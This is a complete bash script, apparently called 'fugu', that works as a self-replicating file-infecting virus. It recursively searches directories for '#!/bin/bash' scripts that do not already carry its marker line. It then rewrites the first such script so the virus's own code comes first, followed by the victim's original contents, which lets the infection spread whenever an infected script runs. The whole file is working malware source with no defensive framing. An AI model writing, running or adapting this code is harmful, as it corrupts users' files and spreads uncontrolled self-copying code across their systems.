#!/bin/bash
 
PID=$$
 
# Set at the command line with the -rd=<path> option, will default to the
# current working directory if unspecified.
ROOT_DIR=
 
# ROOT_PWD stores the root directory where this script lies and is assigned
# the output of a `pwd` when the script first runs.
#
# ROOT_SCR stores the name of this script - we could use $0 to get the
# script name, but we'd have to parse that to get rid of ./path/to/script
# to get the actual name - you can set ROOT_SCR at the command line with
# the -rs option.
#
ROOT_PWD=`pwd`
ROOT_SCR="fugu"
 
ROOT_SHB="#!/bin/bash"
 
# The script begins in the ROOT_DIR directory and will search sub-directories
# to a certain level.
#
# ROOT_DIR is, by default, level 0. A sub-directory in ROOT_DIR would be
# level 1, if it contains a sub that'd be level 2, and so on.
#
# We can limit the depth by setting ROOT_LVL - by default the value is
# 0 (no limit). It can be set to any value >= 0 at the command line with
# the -rl=<value> option.
ROOT_LVL=0
 
# If find_file() finds a suitable file to infect it will store the
# name of the file here - otherwise this will be left unset.
FUGU_SCR=
 
# Does what you'd expect - processes command line arguments.
function sort_args()
{
for arg in "$@"
do
    OPT=
    PAR=
    # Arguments at the command line are input in a specific format:
    #
    #   -option=parameter
    #
    # These two lines separate these fields by first breaking the
    # -option=value at the =, turning it instead into a space. Each
    # field is then extracted using awk...
    OPT=`echo ${arg} | sed 's/=/ /g' | awk '{print $1}'`
    PAR=`echo ${arg} | sed 's/=/ /g' | awk '{print $2}'`
 
    #echo "OPT = ${OPT}"
    #echo "PAR = ${PAR}"
 
    # Options...
    if [ "${OPT}" = "-rd" ]; then
        if [ -z "${PAR}" ]; then
            echo "Error: The -rd option requires a parameter!"
            exit 1
        fi
        ROOT_DIR=${PAR}
    elif [ "${OPT}" = "-rs" ]; then
        if [ -z "${PAR}" ]; then
            echo "Error: The -rs option requires a parameter!"
            exit 1
        fi
        ROOT_SCR=${PAR}
    elif [ "${OPT}" = "-rl" ]; then
        if [ -z "${PAR}" ]; then
            echo "Error: The -rl option requires a parameter!"
            exit 1
        fi
        ROOT_LVL=${PAR}
    else
        echo "Error: ${arg} - unknown option!"
        exit 1
    fi
done
}
 
function find_file()
{
    local   DEPTH_LVL=0
 
    if [ -z ${1} ]; then
        DEPTH_LVL=0
    else
        if [ ${ROOT_LVL} -gt 0 ]; then
            if [ ${1} -ge ${ROOT_LVL} ]; then
                return 1
            fi
        fi
        DEPTH_LVL=${1}
    fi
 
    echo -en "pwd = `pwd`, DEPTH_LVL = ${DEPTH_LVL}\n\n"
 
    # Get a list of everything in the current directory, including
    # and hidden files...
    local LISTALL=`ls -a`
    # ...count the entries in the list.
    local LISTCT=`echo -e "${LISTALL}" | wc -l`
 
    # Iterate through each entry in the LISTALL list...
    local LINE=1
 
    local   ENTRY=
 
    while [ ${LINE} -le $((LISTCT + 1)) ];
    do
        unset ENTRY
 
        # Get the first/next entry from the list.
        ENTRY=`echo -e "${LISTALL}" | head -n ${LINE} | tail -n1`
        LINE=$((LINE + 1))
 
        echo -e "Checking entry ${ENTRY}"
 
        if [ -z "${ENTRY}" ] || [ "${ENTRY}" = "" ]; then
            break
        fi
 
        # Skip those . and .. directories!
        if [ "${ENTRY}" = "." ] || [ "${ENTRY}" = ".." ]; then
            echo "Skipping ${ENTRY}"
            continue 1
        fi
 
        # If we've found a directory we cd there and begin
        # a new search.
        if [ -d "${ENTRY}" ]; then
            cd ${ENTRY}
            echo
            find_file "$((DEPTH_LVL + 1))" 
            #PID=$!
            #wait $PID
            local RES=$?
            cd ..
            echo -e "Returned ${RES}\n"
 
            # If find_file() returned 0 we found a file to
            # infect - keep returning 0.
            #if [ ! -z $? ]; then
                if [ ${RES} -eq 0 ]; then
                    echo -e "Returning 0 @depth ${DEPTH_LVL}\n"
                    echo "FUGU_SCR = ${FUGU_SCR}"
                    return 0
                fi
            #fi
            continue 1
        fi
 
        # Not a directory - look for a file, regular or
        # executable...
        if [ -f "${ENTRY}" ] || [ -x "${ENTRY}" ]; then
            # First line should match the shebang
            # (ROOT_SHB)
            FIRSTLINE=`cat ${ENTRY} | head -n 1`
            echo -e "Line 1 of ${ENTRY} = ${FIRSTLINE}\n"
            if [ "${FIRSTLINE}" = "${ROOT_SHB}" ]; then
                echo "Found match: ${ENTRY}"
                # We need to identify a unique line in
                # this code that we can use to identify
                # already infected files...
                #
                # That ROOT_SHB="#!/bin/bash" line should
                # be enough.
                #
                # First, build an absolute path to the file.
                FUGU_SCR="`pwd`/${ENTRY}"
                FUGU_RES=
                FUGU_RES=`cat ${FUGU_SCR} | grep "ROOT_SHB=\"#!/bin/bash\"" | head -n 1`
                echo "FUGU_RES = ${FUGU_RES}"
                if [ ! -z ${FUGU_RES} ]; then
                    echo -e "${FUGU_RES}\n\n${FUGU_SCR} infected!"
                    FUGU_SCR=
                else
                    echo -e "${FUGU_SCR} not infected!"
                    return 0
                fi
            fi
        fi
    done
    
    # Return 1 to indicate failure
    echo -e "Returning 1 @depth: ${DEPTH_LVL}\n"
    return 1
}
 
function set_scr()
{
    # Need to extract the name of this script (might be an infected file and not
    # the fugu script...)
    if [ "${0:0:2}" = "./" ]; then
        # Executed with ./ - needs to be removed...
        SCR=${0:2}
    else
        SCR=${0}
    fi
 
    # Might be a path string - isolate the script name
    SCRNAME=`echo ${SCR} | sed 's/\// /g' | awk '{print $NF}'`
    #echo "SCRNAME = ${SCRNAME}"
    ROOT_SCR=${SCRNAME}
}
 
# Process all command line arguments.
sort_args $@
PID=$!
wait $PID
 
if [ "${ROOT_DIR}" = "" ]; then
    # No root directory specified - begin in current working directory.
    echo -en "No root dir!\n"
else
    # Root directory specified - begin there.
    echo -en -en "Root dir: ${ROOT_DIR}\n"
    cd ${ROOT_DIR}
fi
 
echo "Root pwd: ${ROOT_SCR}"
echo -en "Root level: ${1}\n\n"
 
# Find a file that can be infected.
#
# We will search ROOT_DIR, all files and sub-directories (ROOT_LVL
# permitting) for the first file containing the shebang (#!/bin/bash)
# that is not already infected...
#
# Set initial depth level to 0.
find_file "0" 
 
PID=$!
wait $PID
 
if [ -z ${FUGU_SCR} ] || [ "${FUGU_SCR}" = "" ]; then
    echo "Couldn't find a script to infect!"
    exit 1
fi
 
echo -en ">> find_file returned ${FUGU_SCR}\n\n"
 
# Count the lines in the target and source (this) script...
LINES_DST=`cat ${FUGU_SCR} | wc -l`
LINES_SRC=`cat "${ROOT_PWD}/${ROOT_SCR}" | wc -l`
 
echo "LINES_DST = ${LINES_DST}"
echo "LINES_SRC = ${LINES_SRC}"
 
LINES_DST=$((LINES_DST - 1))
 
FUGU_OUT=`cat "${ROOT_PWD}/${ROOT_SCR}"`
TRGT_OUT=`cat "${FUGU_SCR}" | tail -n${LINES_DST}`
 
echo -e "${FUGU_OUT}\n\n${TRGT_OUT}\n" > "${FUGU_SCR}"
